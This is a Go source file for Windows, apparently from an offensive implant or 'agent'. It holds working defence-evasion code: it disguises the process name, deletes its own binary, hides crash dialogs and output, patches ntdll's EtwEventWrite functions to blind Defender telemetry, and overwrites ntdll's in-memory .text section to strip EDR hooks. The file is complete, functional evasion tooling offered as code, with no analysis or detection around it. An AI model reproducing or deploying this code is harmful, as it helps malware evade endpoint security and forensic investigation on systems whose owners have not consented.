//go:build windows

package agent

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"
)

func disableCoreDumps() {
	// Suppress Windows Error Reporting dialogs and crash popups.
	const (
		SEM_FAILCRITICALERRORS     = 0x0001
		SEM_NOGPFAULTERRORBOX      = 0x0002
		SEM_NOOPENFILEERRORBOX     = 0x8000
	)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setErrorMode := kernel32.NewProc("SetErrorMode")
	setErrorMode.Call(uintptr(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX)) //nolint:errcheck
}

func masqueradeProcess(name string) {
	if name == "" {
		return
	}
	// Overwrite os.Args[0] bytes in place. This masks /proc-equivalent
	// inspection; the Windows process name comes from the executable
	// filename, so this is best-effort.
	if len(os.Args) > 0 {
		arg0 := os.Args[0]
		ptr := unsafe.Pointer(unsafe.StringData(arg0))
		buf := unsafe.Slice((*byte)(ptr), len(arg0))
		n := copy(buf, name)
		for i := n; i < len(buf); i++ {
			buf[i] = ' '
		}
	}
}

func selfDeleteBinary() {
	// On Windows the running binary is file-locked, so os.Remove() fails.
	// Use the rename-then-delete technique:
	// 1. Rename the locked file to a random name (allowed on Windows).
	// 2. Mark the renamed file for deletion on reboot via MoveFileEx.
	// 3. Attempt immediate deletion (usually fails, but costs nothing).
	if len(os.Args) == 0 {
		return
	}

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Generate a random name in the same directory.
	var rndBytes [8]byte
	if _, err := rand.Read(rndBytes[:]); err != nil {
		return
	}
	dir := filepath.Dir(exePath)
	tmpName := filepath.Join(dir, hex.EncodeToString(rndBytes[:])+".tmp")

	// Convert paths to UTF-16 for Windows API.
	from, err := windows.UTF16PtrFromString(exePath)
	if err != nil {
		return
	}
	to, err := windows.UTF16PtrFromString(tmpName)
	if err != nil {
		return
	}

	// Step 1: Rename the locked binary (allowed on NTFS even while running).
	err = windows.MoveFileEx(from, to, windows.MOVEFILE_REPLACE_EXISTING)
	if err != nil {
		return
	}

	// Step 2: Mark for deletion on next reboot (requires admin; silently fails
	// otherwise, leaving a <random>.tmp forensic artifact in the binary's directory).
	_ = windows.MoveFileEx(to, nil, windows.MOVEFILE_DELAY_UNTIL_REBOOT)

	// Step 3: Best-effort immediate delete (usually fails while running).
	_ = os.Remove(tmpName)
}

func platformOpsec() {
	patchETW()
	unhookNtdll()
}

func silenceOutput() {
	nul, err := os.OpenFile("NUL", os.O_WRONLY, 0)
	if err != nil {
		return
	}
	fd := nul.Fd()
	_ = windows.SetStdHandle(windows.STD_OUTPUT_HANDLE, windows.Handle(fd))
	_ = windows.SetStdHandle(windows.STD_ERROR_HANDLE, windows.Handle(fd))
}

// ---------------------------------------------------------------------------
// ETW patching — degrades Defender's userland telemetry
// ---------------------------------------------------------------------------

// patchETW patches ntdll.dll!EtwEventWrite to return 0 (STATUS_SUCCESS)
// immediately, preventing ETW events from reaching Defender's telemetry
// pipeline. AMD64 only.
func patchETW() {
	// The patch bytes are x86-64 opcodes; skip on other architectures.
	if runtime.GOARCH != "amd64" {
		return
	}

	// xor eax, eax (0x33 0xC0) ; ret (0xC3) — return STATUS_SUCCESS.
	patch := [3]byte{0x33, 0xC0, 0xC3}

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	for _, name := range []string{"EtwEventWrite", "EtwEventWriteFull"} {
		proc := ntdll.NewProc(name)
		if err := proc.Find(); err != nil {
			continue
		}
		addr := proc.Addr()

		var oldProtect uint32
		if err := windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
			continue
		}

		dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)) //nolint:govet // addr from Windows API, not GC-managed
		copy(dst, patch[:])

		_ = windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	}
}

// ---------------------------------------------------------------------------
// ntdll.dll unhooking — removes EDR inline hooks
// ---------------------------------------------------------------------------

// unhookNtdll reads a clean copy of ntdll.dll from disk, parses its PE
// headers to find the .text section, and overwrites the in-memory .text
// section with the clean bytes. This removes any inline hooks (detours)
// placed by Defender or other EDR products.
func unhookNtdll() {
	// Get handle to the in-memory ntdll. LoadDLL returns the already-loaded
	// module — it does not load a second copy. The Handle is the base address.
	dll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return
	}
	moduleBase := uintptr(dll.Handle)

	// Read clean ntdll.dll from disk.
	systemDir, err := windows.GetSystemDirectory()
	if err != nil {
		return
	}
	cleanPath := filepath.Join(systemDir, "ntdll.dll")
	cleanBytes, err := os.ReadFile(cleanPath)
	if err != nil {
		return
	}

	// Parse PE headers to find the .text section.
	sec, err := findPESection(cleanBytes, ".text")
	if err != nil || sec.RawSize == 0 {
		return
	}

	// Validate that raw offset + size doesn't exceed the file.
	if uint64(sec.RawOffset)+uint64(sec.RawSize) > uint64(len(cleanBytes)) {
		return
	}

	// Use min(RawSize, VirtualSize) as copy length. RawSize may include
	// file-alignment padding beyond the actual in-memory section; copying
	// more than VirtualSize would write into adjacent memory.
	copyLen := sec.RawSize
	if sec.VirtualSize > 0 && sec.VirtualSize < copyLen {
		copyLen = sec.VirtualSize
	}

	inMemTextAddr := moduleBase + uintptr(sec.VirtualAddress)

	// Make the in-memory .text section writable.
	var oldProtect uint32
	err = windows.VirtualProtect(inMemTextAddr, uintptr(copyLen), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return
	}

	// Overwrite with clean bytes from disk.
	dst := unsafe.Slice((*byte)(unsafe.Pointer(inMemTextAddr)), copyLen) //nolint:govet // inMemTextAddr from Windows API, not GC-managed
	copy(dst, cleanBytes[sec.RawOffset:sec.RawOffset+copyLen])

	// Restore original protections.
	_ = windows.VirtualProtect(inMemTextAddr, uintptr(copyLen), oldProtect, &oldProtect)
}

// peSection holds the fields we need from a PE IMAGE_SECTION_HEADER.
type peSection struct {
	VirtualSize    uint32 // actual size in memory (before padding)
	VirtualAddress uint32 // RVA where the section is mapped in memory
	RawOffset      uint32 // file offset of raw data on disk
	RawSize        uint32 // size of raw data on disk
}

// findPESection locates a named section in a PE file. The name is matched
// exactly against the null-trimmed 8-byte section name field.
func findPESection(pe []byte, target string) (peSection, error) {
	if len(pe) < 64 {
		return peSection{}, fmt.Errorf("PE too small")
	}

	// e_lfanew at offset 0x3C points to the PE signature.
	peOffset := binary.LittleEndian.Uint32(pe[0x3C:0x40])

	// Need at least PE signature (4) + COFF header (20) past peOffset.
	if uint64(peOffset)+24 > uint64(len(pe)) {
		return peSection{}, fmt.Errorf("invalid PE offset")
	}

	// Verify PE signature "PE\0\0".
	if pe[peOffset] != 'P' || pe[peOffset+1] != 'E' || pe[peOffset+2] != 0 || pe[peOffset+3] != 0 {
		return peSection{}, fmt.Errorf("invalid PE signature")
	}

	// COFF header starts at peOffset+4.
	coffHeader := peOffset + 4
	numberOfSections := binary.LittleEndian.Uint16(pe[coffHeader+2 : coffHeader+4])
	sizeOfOptionalHeader := binary.LittleEndian.Uint16(pe[coffHeader+16 : coffHeader+18])

	// Section table starts after optional header.
	sectionTableOffset := coffHeader + 20 + uint32(sizeOfOptionalHeader)

	targetBytes := []byte(target)

	// Each section header is 40 bytes.
	for i := uint16(0); i < numberOfSections; i++ {
		secStart := sectionTableOffset + uint32(i)*40
		if uint64(secStart)+40 > uint64(len(pe)) {
			break
		}

		// Section name is the first 8 bytes, null-padded.
		nameRaw := pe[secStart : secStart+8]
		name := bytes.TrimRight(nameRaw, "\x00")
		if bytes.Equal(name, targetBytes) {
			return peSection{
				VirtualSize:    binary.LittleEndian.Uint32(pe[secStart+8 : secStart+12]),
				VirtualAddress: binary.LittleEndian.Uint32(pe[secStart+12 : secStart+16]),
				RawOffset:      binary.LittleEndian.Uint32(pe[secStart+20 : secStart+24]),
				RawSize:        binary.LittleEndian.Uint32(pe[secStart+16 : secStart+20]),
			}, nil
		}
	}

	return peSection{}, fmt.Errorf("section %q not found", target)
}
